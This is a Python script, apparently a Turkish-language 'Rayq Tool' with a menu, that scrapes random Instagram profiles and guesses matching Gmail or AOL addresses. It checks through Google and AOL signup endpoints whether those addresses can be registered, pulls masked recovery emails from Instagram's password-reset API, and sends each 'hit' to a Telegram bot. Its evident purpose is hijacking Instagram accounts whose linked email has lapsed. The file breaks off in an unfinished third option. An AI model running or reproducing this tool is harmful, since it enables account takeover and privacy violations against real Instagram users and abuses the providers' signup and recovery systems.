# Otomatik Birleştirilmiş Rayq Tool


print("╔════════════════════════════╗")
print("║      RAYQ TOOL SEÇENEK     ")
print("╠════════════════════════════╣")
print("║ 1. Rayq Random Gmail            ")
print("║ 2. Rayq AOL 2012-2013          ")
print("║ 3. Rayq Gmail 2013             ")
print("║ 4. Rayg Filtreli")
print("╚════════════════════════════╝")

secim = input("Seçiminiz (1-4): ")

if secim == "1":


    print(">>> Rayq Gmail Checker (genel) çalışıyor...")
    import os
    import sys
    import re
    import json
    import string
    import random
    import hashlib
    import uuid
    import time
    from datetime import datetime
    from threading import Thread, Timer
    import requests
    from requests import post as pp
    from user_agent import generate_user_agent
    from random import choice, randrange
    from cfonts import render, say
    from colorama import Fore, Style, init
    import webbrowser
    #Rayq
    INSTAGRAM_RECOVERY_URL = 'https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/'
    IG_SIG_KEY_VERSION = 'ig_sig_key_version'
    SIGNED_BODY = 'signed_body'
    COOKIE_VALUE = 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj'
    CONTENT_TYPE_HEADER = 'Content-Type'
    COOKIE_HEADER = 'Cookie'
    USER_AGENT_HEADER = 'User-Agent'
    DEFAULT_USER_AGENT = ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                          'AppleWebKit/537.36 (KHTML, like Gecko) '
                          'Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0')
    
    GOOGLE_ACCOUNTS_URL = 'https://accounts.google.com'
    GOOGLE_ACCOUNTS_DOMAIN = 'accounts.google.com'
    REFERRER_HEADER = 'referer'
    ORIGIN_HEADER = 'origin'
    AUTHORITY_HEADER = 'authority'
    CONTENT_TYPE_FORM = 'application/x-www-form-urlencoded; charset=UTF-8'
    CONTENT_TYPE_FORM_ALT = 'application/x-www-form-urlencoded;charset=UTF-8'
    
    TOKEN_FILE = 'tl.txt'
    rayq_domain = '@gmail.com' 
    
    E = '\033[1;31m' #Red
    M = '\x1b[1;37m' #White
    total_hits = 0
    hits = 0
    bad_insta = 0
    bad_email = 0
    good_ig = 0
    infoinsta = {}
    
    RayqHeader = render('Vip', colors=['white', 'red'], align='center')
    print("\033[1;31m═" * 67)
    print(RayqHeader)
    print("\033[1;31m═" * 67)
    
    ID = input("\x1b[1;37mİd: ")
    TOKEN = input("Token:")
    
    os.system('clear')
    print("\033[1;31m═" * 67)
    print(RayqHeader)
    print("\033[1;31m═" * 67)
    
    def sayac():
        ge = hits               
        bt = bad_insta + bad_email 
        be = good_ig          
        print(f"\rTrue : {M}{ge}  {E} Bad : {M}{bt}  False : {M}{be} ", end='')
    
    def update_stats():
        sayac()
    
    def Rayq():
        try:
            alphabet = 'azertyuiopmlkjhgfdsqwxcvbn'
            n1 = ''.join(choice(alphabet) for _ in range(randrange(6, 9)))
            n2 = ''.join(choice(alphabet) for _ in range(randrange(3, 9)))
            host = ''.join(choice(alphabet) for _ in range(randrange(15, 30)))
            headers = {
                'accept': '*/*',
                'accept-language': 'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6',
                CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM_ALT,
                'google-accounts-xsrf': '1',
                USER_AGENT_HEADER: str(generate_user_agent())
            }
            recovery_url = (f"{GOOGLE_ACCOUNTS_URL}/signin/v2/usernamerecovery"
                            "?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB")
            res1 = requests.get(recovery_url, headers=headers)
            tok = re.search(
                'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',
                res1.text
            ).group(2)
            cookies = {'__Host-GAPS': host}
            headers2 = {
                AUTHORITY_HEADER: GOOGLE_ACCOUNTS_DOMAIN,
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM_ALT,
                'google-accounts-xsrf': '1',
                ORIGIN_HEADER: GOOGLE_ACCOUNTS_URL,
                REFERRER_HEADER: ('https://accounts.google.com/signup/v2/createaccount'
                                  '?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn'),
                USER_AGENT_HEADER: generate_user_agent()
            }
            data = {
                'f.req': f'["{tok}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
                'deviceinfo': ('[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,'
                               'null,0,1,"",null,null,2,2]')
            }
            response = requests.post(f"{GOOGLE_ACCOUNTS_URL}/_/signup/validatepersonaldetails",
                                     cookies=cookies, headers=headers2, data=data)
            token_line = str(response.text).split('",null,"')[1].split('"')[0]
            host = response.cookies.get_dict()['__Host-GAPS']
            with open(TOKEN_FILE, 'w') as f:
                f.write(f"{token_line}//{host}\n")
        except Exception as e:
            print(e)
            Rayq()
    
    Rayq()
    
    
    def check_gmail(email):
        global bad_email, hits
        try:
            if '@' in email:
                email = email.split('@')[0]
            with open(TOKEN_FILE, 'r') as f:
                token_data = f.read().splitlines()[0]
            tl, host = token_data.split('//')
            cookies = {'__Host-GAPS': host}
            headers = {
                AUTHORITY_HEADER: GOOGLE_ACCOUNTS_DOMAIN,
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM_ALT,
                'google-accounts-xsrf': '1',
                ORIGIN_HEADER: GOOGLE_ACCOUNTS_URL,
                REFERRER_HEADER: f"https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL={tl}",
                USER_AGENT_HEADER: generate_user_agent()
            }
            params = {'TL': tl}
            data = (f"continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn"
                    f"&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D"
                    "&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false"
                    "&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22"
                    "%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D"
                    "&gmscoreversion=undefined&flowName=GlifWebSignIn&")
            response = pp(f"{GOOGLE_ACCOUNTS_URL}/_/signup/usernameavailability",
                          params=params, cookies=cookies, headers=headers, data=data)
            if '"gf.uar",1' in response.text:
                hits += 1
                update_stats()
                full_email = email + rayq_domain
                username, domain = full_email.split('@')
                InfoAcc(username, domain)
            else:
                bad_email += 1
                update_stats()
        except Exception:
            pass
    
    def check(email):
        global good_ig, bad_insta
        ua = generate_user_agent()
        dev = 'android-'
        device_id = dev + hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16]
        uui = str(uuid.uuid4())
        headers = {
            USER_AGENT_HEADER: ua,
            COOKIE_HEADER: COOKIE_VALUE,
            CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM
        }
        data = {
            SIGNED_BODY: ('0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' +
                          json.dumps({
                              '_csrftoken': '9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
                              'adid': uui,
                              'guid': uui,
                              'device_id': device_id,
                              'query': email
                          })),
            IG_SIG_KEY_VERSION: '4'
        }
        response = requests.post(INSTAGRAM_RECOVERY_URL, headers=headers, data=data).text
        if email in response:
            if rayq_domain in email:
                check_gmail(email)
            good_ig += 1
            update_stats()
        else:
            bad_insta += 1
            update_stats()       
            
    def rest(user):
        try:
            headers = {
                'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
                'X-Pigeon-Rawclienttime': '1700251574.982',
                'X-IG-Connection-Speed': '-1kbps',
                'X-IG-Bandwidth-Speed-KBPS': '-1.000',
                'X-IG-Bandwidth-TotalBytes-B': '0',
                'X-IG-Bandwidth-TotalTime-MS': '0',
                'X-Bloks-Version-Id': ('c80c5fb30dfae9e273e4009f03b18280'
                                       'bb343b0862d663f31a3c63f13a9f31c0'),
                'X-IG-Connection-Type': 'WIFI',
                'X-IG-Capabilities': '3brTvw==',
                'X-IG-App-ID': '567067343352427',
                USER_AGENT_HEADER: ('Instagram 100.0.0.17.129 Android (29/10; 420dpi; '
                                    '1080x2129; samsung; SM-M205F; m20lte; exynos7904; '
                                    'en_GB; 161478664)'),
                'Accept-Language': 'en-GB, en-US',
                COOKIE_HEADER: COOKIE_VALUE,
                CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM,
                'Accept-Encoding': 'gzip, deflate',
                'Host': 'i.instagram.com',
                'X-FB-HTTP-Engine': 'Liger',
                'Connection': 'keep-alive',
                'Content-Length': '356'
            }
            data = {
                SIGNED_BODY: ('0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.'
                              '{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj",'
                              '"adid":"0dfaf820-2748-4634-9365-c3d8c8011256",'
                              '"guid":"1f784431-2663-4db9-b624-86bd9ce1d084",'
                              '"device_id":"android-b93ddb37e983481c",'
                              '"query":"' + user + '"}'),
                IG_SIG_KEY_VERSION: '4'
            }
            response = requests.post(INSTAGRAM_RECOVERY_URL, headers=headers, data=data).json()
            rayqq = response.get('email', 'Reset None')
        except:
            rayqq = 'Reset None'
        return rayqq
        
    def date(hy):
        try:
            ranges = [
                (1279000, 2010),
                (17750000, 2011),
                (279760000, 2012),
                (900990000, 2013),
                (1629010000, 2014),
                (2500000000, 2015),
                (3713668786, 2016),
                (5699785217, 2017),
                (8597939245, 2018),
                (21254029834, 2019),
            ]
            for upper, year in ranges:
                if hy <= upper:
                    return year
            return 2023
        except Exception:
            pass    
            
    def InfoAcc(username, domain):
        global total_hits
        account_info = infoinsta.get(username, {})
        user_id = account_info.get('pk')
        full_name = account_info.get('full_name')
        followers = account_info.get('follower_count', 0)
        following = account_info.get('following_count')
        posts = account_info.get('media_count')
        bio = account_info.get('biography')
        meta_status = "True" if followers > 40 else "False"
        total_hits += 1        
        info_text = f"""
    ══════𝗥𝗔𝗬𝗤══════
    𝐇𝐢𝐭𝐬: {total_hits}
    𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞: {username}
    𝐌𝐚𝐢𝐥: {username}@{domain}
    𝐅𝐨𝐥𝐥𝐨𝐰𝐞𝐫𝐬: {followers}
    𝐅𝐨𝐥𝐥𝐨𝐰𝐢𝐧𝐠: {following}
    𝐌𝐞𝐭𝐚: {meta_status}
    𝐁𝐢𝐨: {account_info.get('biography','')}
    𝐑𝐞𝐬𝐭: {rest(username)}
    𝐋𝐢𝐧𝐤: 
     https://www.instagram.com/{username}
    ══════𝗥𝗔𝗬𝗤══════
     𝑩𝒀 ~ @RusyaBaskan ~ @RayqTool
    """
    
        with open('rayqhit2.txt', 'a') as f:
            f.write(info_text + "\n")
        try:
            requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text={info_text}")
        except Exception:
            pass
    
    def rayq_python():
        while True:
            data = {
                'lsd': ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
                'variables': json.dumps({
                    'id': int(random.randrange(10000, 21254029834)),
                    'render_surface': 'PROFILE'
                }),
                'doc_id': '25618261841150840'
            }
            headers = {'X-FB-LSD': data['lsd']}
            try:
                response = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data)
                account = response.json().get('data', {}).get('user', {})
                username = account.get('username')
                if username:
                    followers = account.get('follower_count', 0)
                    if followers < 1: 
                        continue
                    infoinsta[username] = account
                    emails = [username + rayq_domain]
                    for email in emails:
                        check(email)
            except Exception:
                pass
                
    def stats_loop():
        while True:
            update_stats()
            time.sleep(1)
    
    Thread(target=stats_loop, daemon=True).start()
    
    for _ in range(100):
        Thread(target=rayq_python).start()                            
elif secim == "2":
    print(">>> Rayq AOL Checker (2012-2013 arası) çalışıyor...")
    
    import os
    import sys
    import re
    import json
    import string
    import random
    import hashlib
    import uuid
    import time
    from datetime import datetime
    from threading import Timer
    import requests
    from requests import post as pp
    from user_agent import generate_user_agent
    from random import choice, randrange
    from cfonts import render, say
    from colorama import Fore, Style, init
    import webbrowser
    webbrowser.open("")
    init(autoreset=True)
    rayqheader = render(' AOL ', colors=['white', 'red'], align='center')
    print("\033[1;31;40m═" * 67)
    print(rayqheader)
    print("\033[1;31;40m═" * 67)
    
    id = input("- İd : ")
    token = input("- Token : ")
    os.system('clear')
    print("\033[1;31;40m═" * 67)
    print(rayqheader)
    print("  ")
    print("\033[1;31;40m═" * 67)
    
    instagram_recovery_url = 'https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/'
    ig_sig_key_version = 'ig_sig_key_version'
    signed_body = 'signed_body'
    cookie_value = 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj'
    content_type_header = 'Content-Type'
    cookie_header = 'Cookie'
    user_agent_header = 'User-Agent'
    default_user_agent = ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                          'AppleWebKit/537.36 (KHTML, like Gecko) '
                          'Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0')
    tk = 'tl.txt'
    aol_domain = '@aol.com'
    
    E_color = '\033[1;31m'
    W9 = "\033[1m\033[34m"
    M_color = '\x1b[1;37m'
    HH = '\033[1;34m'
    R_color = '\033[1;31;40m'
    F_color = '\033[1;32;40m'
    C_color = "\033[1;97;40m"
    B = '\033[1;36;40m'
    C1 = '\x1b[38;5;120m'
    
    total_hits = 0
    hits = 0
    bad_insta = 0
    bad_email = 0
    good_ig = 0
    infoinsta = {}
    
    
    
    
    
    import sys
    import os
    
    def memesex():
        os.system('clear')
        green = '\033[92m'
        red = '\033[91m'
        pink = '\033[95m'
        reset = '\033[0m'
    
        output = (
            f"\r𝐇𝐢𝐭 : {green}{hits}{reset}  "
            f"𝐁𝐚𝐝 : {red}{bad_insta + bad_email}{reset}  "
            f"𝐅𝐚𝐥𝐬𝐞 : {pink}{good_ig}{reset}    @RusyaBaskan\r"
        )
        sys.stdout.write(output)
        sys.stdout.flush()
    
    def update_stats():
        memesex()
    
    def rayqmain():
        try:
            alphabet = 'azertyuiopmlkjhgfdsqwxcvbn'
            n1 = ''.join(choice(alphabet) for _ in range(randrange(6, 9)))
            n2 = ''.join(choice(alphabet) for _ in range(randrange(3, 9)))
            host = ''.join(choice(alphabet) for _ in range(randrange(15, 30)))
            headers = {
                'accept': '*/*',
                'accept-language': 'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6',
                content_type_header: 'application/x-www-form-urlencoded;charset=UTF-8',
                'google-accounts-xsrf': '1',
                user_agent_header: str(generate_user_agent())
            }
            recovery_url = "https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB"
            res1 = requests.get(recovery_url, headers=headers)
            tok = re.search(
                'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',
                res1.text
            ).group(2)
            cookies = {'__Host-GAPS': host}
            headers2 = {
                'authority': 'accounts.google.com',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                content_type_header: 'application/x-www-form-urlencoded;charset=UTF-8',
                'google-accounts-xsrf': '1',
                'origin': 'https://accounts.google.com',
                'referer': ('https://accounts.google.com/signup/v2/createaccount'
                            '?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn'),
                user_agent_header: generate_user_agent()
            }
            data = {
                'f.req': f'["{tok}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
                'deviceinfo': ('[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,'
                               'null,0,1,"",null,null,2,2]')
            }
            response = requests.post("https://accounts.google.com/_/signup/validatepersonaldetails",
                                     cookies=cookies, headers=headers2, data=data)
            token_line = str(response.text).split('",null,"')[1].split('"')[0]
            host = response.cookies.get_dict()['__Host-GAPS']
            with open(tk, 'w') as f:
                f.write(f"{token_line}//{host}\n")
        except Exception as e:
            print(e)
            rayqmain()
    
    rayqmain()
    
    def aol_login(email):
        global hits, bad_email
        try:
            qq = requests.get('https://login.aol.com/account/create', headers={
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
                'accept-language': 'en-US,en;q=0.9',
            })
            cookies = qq.cookies.get_dict()
            tm1 = str(time.time()).split('.')[0]
            cookies.update({
                'gpp': 'DBAA',
                'gpp_sid': '-1',
                '__gads': f'ID=c0M0fd00676f0ea1:T={tm1}:RT={tm1}:S=ALNI_MaEGaVTSG6nQFkSJ-RnxSZrF5q5XA',
                '__gpi': f'UID=00000cf0e8904e94:T={tm1}:RT={tm1}:S=ALNI_MYCzPrYn9967HtpDSITUe5Z4ZwGOQ',
                'cmp': f't={tm1}&j=0&u=1---',
            })
            text = qq.text
            specData = text.split('name="attrSetIndex">\n        <input type="hidden" value="')[1].split('" name="specData">')[0]
            specId = text.split('name="browser-fp-data" id="browser-fp-data" value="" />\n        <input type="hidden" value="')[1].split('" name="specId">')[0]
            crumb = text.split('name="cacheStored">\n        <input type="hidden" value="')[1].split('" name="crumb">')[0]
            sessionIndex = text.split('"acrumb">\n        <input type="hidden" value="')[1].split('" name="sessionIndex">')[0]
            acrumb = text.split('name="crumb">\n        <input type="hidden" value="')[1].split('" name="acrumb">')[0]
            try:
                os.remove('aol.rq.txt')
                os.remove('aol.cokie.txt')
            except:
                pass
            with open('aol.rq.txt', 'a') as t:
                t.write(f"{specData}Π{specId}Π{crumb}Π{sessionIndex}Π{acrumb}\n")
            with open('aol.cokie.txt', 'a') as g:
                g.write(str(cookies) + '\n')
            with open("aol.rq.txt", "r") as f:
                for line in f:
                    specData, specId, crumb, sessionIndex, acrumb = line.strip().split('Π')
            with open("aol.cokie.txt", "r") as f:
                for line in f:
                    cookies = eval(line.strip())
            headers = {
                'authority': 'login.aol.com',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://login.aol.com',
                'referer': f'https://login.aol.com/account/create?specId={specId}&done=https%3A%2F%2Fwww.aol.com',
                'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Microsoft Edge";v="120"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
                'x-requested-with': 'XMLHttpRequest',
            }
            params = {
                'validateField': 'userId',
            }
            if '@' in email:
                uname = email.split('@')[0]
            else:
                uname = email
            data = f'browser-fp-data=%7B%22language%22%3A%22en-US%22%2C%22colorDepth%22%3A24%2C%22deviceMemory%22%3A8%2C%22pixelRatio%22%3A1%2C%22hardwareConcurrency%22%3A4%2C%22timezoneOffset%22%3A-60%2C%22timezone%22%3A%22Africa%2FCasablanca%22%2C%22sessionStorage%22%3A1%2C%22localStorage%22%3A1%2C%22indexedDb%22%3A1%2C%22cpuClass%22%3A%22unknown%22%2C%22platform%22%3A%22Win32%22%2C%22doNotTrack%22%3A%22unknown%22%2C%22plugins%22%3A%7B%22count%22%3A5%2C%22hash%22%3A%222c14024bf8584c3f7f63f24ea490e812%22%7D%2C%22canvas%22%3A%22canvas%20winding%3Ayes~canvas%22%2C%22webgl%22%3A1%2C%22webglVendorAndRenderer%22%3A%22Google%20Inc.%20(Intel)~ANGLE%20(Intel%2C%20Intel(R)%20HD%20Graphics%204000%20(0x00000166)%20Direct3D11%20vs_5_0%20ps_5_0%2C%20D3D11)%22%2C%22adBlock%22%3A0%2C%22hasLiedLanguages%22%3A0%2C%22hasLiedResolution%22%3A0%2C%22hasLiedOs%22%3A0%2C%22hasLiedBrowser%22%3A0%2C%22touchSupport%22%3A%7B%22points%22%3A0%2C%22event%22%3A0%2C%22start%22%3A0%7D%2C%22fonts%22%3A%7B%22count%22%3A33%2C%22hash%22%3A%22edeefd360161b4bf944ac045e41d0b21%22%7D%2C%22audio%22%3A%22124.04347527516074%22%2C%22resolution%22%3A%7B%22w%22%3A%221600%22%2C%22h%22%3A%22900%22%7D%2C%22availableResolution%22%3A%7B%22w%22%3A%22860%22%2C%22h%22%3A%221600%22%7D%2C%22ts%22%3A%7B%22serve%22%3A1704793094844%2C%22render%22%3A1704793096534%7D%7D&specId={specId}&cacheStored=&crumb={crumb}&acrumb={acrumb}&sessionIndex={sessionIndex}&done=https%3A%2F%2Fwww.aol.com&googleIdToken=&authCode=&attrSetIndex=0&specData={specData}&multiDomain=&tos0=oath_freereg%7Cus%7Cen-US&firstName=ahmed&lastName=Mahos&userid-domain=yahoo&userId={uname}&password=Drahmed2006##$$&mm=10&dd=24&yyyy=2000&signup='
            res = requests.post('https://login.aol.com/account/module/create', params=params, headers=headers, data=data, cookies=cookies).text
            if '{"errors":[]}' in res:
                hits += 1
                memesex()
                if '@' not in email:
                    ok = email + '@aol.com'
                    uname, dom = ok.split('@')
                    InfoAcc(uname, dom)
                else:
                    uname, dom = email.split('@')
                    InfoAcc(uname, dom)
            else:
                global bad_email
                bad_email += 1
                memesex()
        except Exception as e:
            print(e)
    
    
    def check_aol(email):
        aol_login(email)
    
    def check(email):
        global good_ig, bad_insta
        ua = generate_user_agent()
        dev = 'android-'
        device_id = dev + hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16]
        uui = str(uuid.uuid4())
        headers = {
            user_agent_header: ua,
            cookie_header: cookie_value,
            content_type_header: 'application/x-www-form-urlencoded; charset=UTF-8'
        }
        data = {
            signed_body: ('0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' +
                          json.dumps({
                              '_csrftoken': '9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
                              'adid': uui,
                              'guid': uui,
                              'device_id': device_id,
                              'query': email
                          })),
            ig_sig_key_version: '4'
        }
        response = requests.post(instagram_recovery_url, headers=headers, data=data).text
        if email in response:
            if aol_domain in email:
                check_aol(email)
            good_ig += 1
            update_stats()
        else:
            bad_insta += 1
            update_stats()
    
    def rest(user):
        try:
            headers = {
                'x-pigeon-session-id': '50cc6861-7036-43b4-802e-fb4282799c60',
                'x-pigeon-rawclienttime': '1700251574.982',
                'x-ig-connection-speed': '-1kbps',
                'x-ig-bandwidth-speed-kbps': '-1.000',
                'x-ig-bandwidth-totalbytes-b': '0',
                'x-ig-bandwidth-totaltime-ms': '0',
                'x-bloks-version-id': ('c80c5fb30dfae9e273e4009f03b18280'
                                       'bb343b0862d663f31a3c63f13a9f31c0'),
                'x-ig-connection-type': 'wifi',
                'x-ig-capabilities': '3brtvw==',
                'x-ig-app-id': '567067343352427',
                user_agent_header: ('instagram 100.0.0.17.129 android (29/10; 420dpi; '
                                    '1080x2129; samsung; sm-m205f; m20lte; exynos7904; '
                                    'en_gb; 161478664)'),
                'accept-language': 'en-gb, en-us',
                cookie_header: cookie_value,
                content_type_header: 'application/x-www-form-urlencoded; charset=UTF-8',
                'accept-encoding': 'gzip, deflate',
                'host': 'i.instagram.com',
                'x-fb-http-engine': 'liger',
                'connection': 'keep-alive',
                'content-length': '356'
            }
            data = {
                signed_body: ('0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.'
                              '{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj",'
                              '"adid":"0dfaf820-2748-4634-9365-c3d8c8011256",'
                              '"guid":"1f784431-2663-4db9-b624-86bd9ce1d084",'
                              '"device_id":"android-b93ddb37e983481c",'
                              '"query":"' + user + '"}'),
                ig_sig_key_version: '4'
            }
            response = requests.post(instagram_recovery_url, headers=headers, data=data).json()
            matrx_reset = response.get('email', 'Reset None')
        except:
            matrx_reset = 'Reset None'
        return matrx_reset
    
    def date(hy):
        try:
            ranges = [
                (1279000, 2010),
                (17750000, 2011),
                (279760000, 2012),
                (900990000, 2013),
                (1629010000, 2014),
                (2500000000, 2015),
                (3713668786, 2016),
                (5699785217, 2017),
                (8597939245, 2018),
                (21254029834, 2019),
            ]
            for upper, year in ranges:
                if hy <= upper:
                    return year
            return 2023
        except Exception:
            return "Unknown"
    
    def InfoAcc(username, domain):
        global total_hits
        account_info = infoinsta.get(username, {})
        user_id = account_info.get('pk')
        full_name = account_info.get('full_name')
        followers = account_info.get('follower_count')
        following = account_info.get('following_count')
        posts = account_info.get('media_count')
        bio = account_info.get('biography')
        calc_date = date(user_id) if user_id else "Unknown"
        total_hits += 1
        tlg = f"""    
    𝐇𝐢𝐭 𝐀𝐜𝐜𝐨𝐮𝐧𝐭 𝐈̇𝐧𝐬𝐭𝐚𝐠𝐫𝐚𝐦
    ══════𝗥𝗔𝗬𝗤══════
    𝐇𝐢𝐭𝐬 : [ {total_hits} ]
    𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞 : [ {username} ]
    𝐌𝐚𝐢𝐥 : [ {username}@{domain} ]
    𝐅𝐨𝐥𝐥𝐨𝐰𝐞𝐫𝐬 : [ {followers} ]
    𝐅𝐨𝐥𝐥𝐨𝐰𝐢𝐧𝐠 : [ {following} ]
    𝐏𝐨𝐬𝐭 : [ {posts} ]
    𝐃𝐚𝐭𝐞 : [ {calc_date} ]
    𝐁𝐢𝐨 : [ {bio} ]
    𝐑𝐞𝐬𝐭 : [ {rest(username)} ]
    ══════𝗥𝗔𝗬𝗤══════
    𝐁𝐲 ~ @RusyaBaskan ~ @RayqTool
    
    """
        with open('Aol.txt', 'a') as f:
            f.write(tlg + "\n")
        try:
            requests.get(f"https://api.telegram.org/bot{token}/sendmessage?chat_id={id}&text={tlg}")
        except Exception:
            pass
    
    def rayq_python():
        while True:
            data = {
                'lsd': ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
                'variables': json.dumps({
                    'id': int(random.randrange(279760000, 900990000)),
                    'render_surface': 'PROFILE'
                }),
                'doc_id': '25618261841150840'
            }
            headers = {'x-fb-lsd': data['lsd']}
            try:
                response = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data)
                account = response.json().get('data', {}).get('user', {})
                username = account.get('username')
                if username:
                    infoinsta[username] = account
                    emails = [username + aol_domain]
                    for email in emails:
                        check(email)
            except Exception:
                pass
    
    def stats_loop():
        while True:
            update_stats()
            time.sleep(1)
    
    from threading import Thread
    Thread(target=stats_loop, daemon=True).start()
    
    for _ in range(100):
        Thread(target=rayq_python).start()

elif secim == "3":
    print(">>> Rayq Gmail Checker (sadece 2013) çalışıyor...")
    import os
    import sys
    import re
    import json
    import string
    import random
    import hashlib
    import uuid
    import time
    from datetime import datetime, timedelta
    from threading import Thread, Timer
    import requests
    from requests import post as pp
    from user_agent import generate_user_agent
    from random import choice, randrange
    from cfonts import render, say
    from colorama import Fore, Style, init
    import webbrowser
    
    
    
    
    
    
    
    
    rayqig = {
        "instagram_recovery_url": "https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/",
        "ig_sig_key_version": "ig_sig_key_version",
        "signed_body": "signed_body",
        "cookie_value": "mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj",
        "content_type_header": "Content-Type",
        "cookie_header": "Cookie",
        "user_agent_header": "User-Agent",
        "default_user_agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
        ),
        "google_accounts_url": "https://accounts.google.com",
        "google_accounts_domain": "accounts.google.com",
        "referrer_header": "referer",
        "origin_header": "origin",
        "authority_header": "authority",
        "content_type_form": "application/x-www-form-urlencoded; charset=UTF-8",
        "content_type_form_alt": "application/x-www-form-urlencoded;charset=UTF-8",
        "token_file": "tl.txt",
        "rayqdomain": "@gmail.com"
    }
    
    # Renkler
    E = '\033[1;31m'
    W9 = "\033[1m\033[34m"
    M = '\x1b[1;37m'
    HH = '\033[1;34m'
    R = '\033[1;31;40m'
    F = '\033[1;32;40m'
    C = "\033[1;97;40m"
    B = '\033[1;36;40m'
    C1 = '\x1b[38;5;120m'
    P1 = '\x1b[38;5;150m'
    P2 = '\x1b[38;5;190m'
    Y = '\033[1;33m'
    Z = '\033[1;31m'
    X = '\033[1;33m'
    Z1 = '\033[2;31m'
    
    red = "\033[1m\033[31m"
    green = "\033[1m\033[32m"
    yellow = "\033[1m\033[33m"
    blue = "\033[1m\033[34m"
    cyan = "\033[1m\033[36m"
    magenta = "\033[1m\033[35m"
    white = "\033[1m\033[37m"
    orange = "\033[1m\033[38;5;208m"
    reset = "\033[0m"
    
    total_hits = 0
    hits = 0
    bad_insta = 0
    bad_email = 0
    good_ig = 0
    infoinsta = {}
    
    
    
    
    
    
    
    
    
    ID = input('chat id:  ')
    
    token = input('token: ')
    
    
    os.system('clear')
    
    def pppp():
